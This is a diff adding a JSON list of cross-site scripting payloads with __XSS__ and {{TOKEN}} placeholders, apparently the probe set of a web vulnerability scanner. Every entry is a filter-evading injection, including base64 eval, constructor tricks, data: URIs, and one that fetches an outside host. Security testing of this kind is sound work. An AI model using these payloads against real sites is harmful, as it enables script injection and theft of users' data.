@@ -1,0 +1,15 @@
+[
+  "\uff1cscript\uff1e__XSS__('{{TOKEN}}')\uff1c/script\uff1e",
+  "<a href=\"jav&Tab;ascript&colon;__XSS__('{{TOKEN}}')\">click</a>",
+  "<a href=\"javascript&colon;__XSS__('{{TOKEN}}')\">click</a>",
+  "<script/**/type=\"text/javascript\">__XSS__('{{TOKEN}}')</script>",
+  "<svg><![CDATA[><script>__XSS__('{{TOKEN}}')</script>]]></svg>",
+  "<img src=x onerror=\"window['ev'+'al'](window['at'+'ob']('X19YU1NfXygne3tUT0tFTn19Jyk='))\">",
+  "<svg/onload=__XSS__`{{TOKEN}}`>",
+  "<img src=x onerror=\"window.onerror=eval;throw'=__XSS__(\\'{{TOKEN}}\\')'\">",
+  "<iframe/src=\"data:text/html,<script>parent.__XSS__('{{TOKEN}}')</script>\">",
+  "<video><source onerror=\"javascript:__XSS__('{{TOKEN}}')\">",
+  "<script/src=data:,__XSS__('{{TOKEN}}')></script>",
+  "<svg onload=fetch('//'&#43;'{{TOKEN}}')>",
+  "<img src=1 onerror=([].map.constructor('__XSS__(\"{{TOKEN}}\")'))()>"
+]
